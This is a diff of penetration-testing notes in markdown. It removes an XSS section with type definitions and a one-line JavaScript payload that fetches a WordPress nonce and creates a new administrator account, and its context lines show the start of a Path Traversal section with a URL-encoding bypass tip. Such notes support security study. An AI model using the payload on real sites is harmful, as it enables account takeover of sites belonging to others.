@@ -1,20 +1,3 @@
-## XSS
-Cross-Site Scripting is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.
-- **Stored (Persistent):** the exploit payload is stored in a database or otherwise cached by a server, so every visitor retrieves that payload and executes it
-- **Reflected:** the payload is included in a crafted request or link, only attacking the client that submitted this request
-- **DOM-based:** the payload never reach the server, being entirely received and executed by the client
-
-### Notes
-- executed in the client-side
-- persistent is stored in server-side
-- both persistent and reflected originates from a servers input that was not sanitized, but DOM is purely client-side
-- web
-- can be used to steal cookies, tokens and other session information, besides sensitive data
-
-```js
-let u="/wp-admin/user-new.php";let r=new XMLHttpRequest();r.open("GET",u,!1);r.send();let n=(/ser" value="([^"]*?)"/g).exec(r.responseText)[1];r=new XMLHttpRequest();r.open("POST",u,1);r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");r.send("action=createuser&_wpnonce_create-user="+n+"&user_login=_USR_&email=tmp@mail.com&pass1=_PWD_&pass2=_PWD_&role=administrator");
-```
-
 ## Path Traversal
 Abusing file inclusion set in the request to perform arbitrary read
 - change the char encoding, as by replacing the `.` with `%2e`
